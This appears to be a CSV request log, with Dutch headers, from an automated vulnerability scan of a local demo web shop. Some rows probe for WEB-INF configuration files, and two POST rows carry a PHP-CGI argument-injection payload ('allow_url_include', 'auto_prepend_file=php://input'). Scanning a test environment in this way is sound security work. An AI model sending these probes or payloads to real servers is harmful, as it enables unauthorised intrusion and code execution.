Id,Request Tijdstempel,Response Tijdstempel,Methode,URL,Code,Reden,RTT,Grootte Resp. Header,Grootte Resp. Body
90,Mon Mar 20 21:50:04 CET 2023,Mon Mar 20 21:50:04 CET 2023,GET,http://172.18.0.4:30001/carts/carts/olnzz4SBrDqfWICAtnRybqbpKoKzzLah/5967298566077357791,404,Not Found,101,429,77
92,Mon Mar 20 21:50:04 CET 2023,Mon Mar 20 21:50:04 CET 2023,GET,http://172.18.0.4:30001/WEB-INF/web.xml,404,Not Found,19,429,28
93,Mon Mar 20 21:50:04 CET 2023,Mon Mar 20 21:50:04 CET 2023,GET,http://172.18.0.4:30001/WEB-INF/applicationContext.xml,404,Not Found,3,426,43
94,Mon Mar 20 21:50:04 CET 2023,Mon Mar 20 21:50:04 CET 2023,GET,http://172.18.0.4:30001/WEB-INF/classes/web/xml.class,404,Not Found,27,430,42
95,Mon Mar 20 21:50:04 CET 2023,Mon Mar 20 21:50:04 CET 2023,GET,http://172.18.0.4:30001/WEB-INF/classes/applicationContext/xml.class,404,Not Found,52,428,57
96,Mon Mar 20 21:50:04 CET 2023,Mon Mar 20 21:50:04 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/5019004661488404809,200,OK,339,229,84
97,Mon Mar 20 21:50:04 CET 2023,Mon Mar 20 21:50:04 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/9154111023760730752,200,OK,268,229,84
98,Mon Mar 20 21:50:04 CET 2023,Mon Mar 20 21:50:04 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/3758527239229717916,200,OK,292,229,84
99,Mon Mar 20 21:50:04 CET 2023,Mon Mar 20 21:50:04 CET 2023,POST,http://172.18.0.4:30001/carts/carts/olnzz4SBrDqfWICAtnRybqbpKoKzzLah/items?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,404,Not Found,8,431,124
100,Mon Mar 20 21:50:04 CET 2023,Mon Mar 20 21:50:04 CET 2023,POST,http://172.18.0.4:30001/carts/carts/olnzz4SBrDqfWICAtnRybqbpKoKzzLah/items?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,404,Not Found,14,435,124
101,Mon Mar 20 21:50:04 CET 2023,Mon Mar 20 21:50:04 CET 2023,GET,http://172.18.0.4:30001/carts/carts/olnzz4SBrDqfWICAtnRybqbpKoKzzLah/items,404,Not Found,6,428,63
102,Mon Mar 20 21:50:04 CET 2023,Mon Mar 20 21:50:04 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/7821176037141448594,200,OK,273,229,84
104,Mon Mar 20 21:50:04 CET 2023,Mon Mar 20 21:50:04 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/5945010856422642011,200,OK,304,229,84
106,Mon Mar 20 21:50:04 CET 2023,Mon Mar 20 21:50:04 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/245914654903516486,200,OK,327,229,84
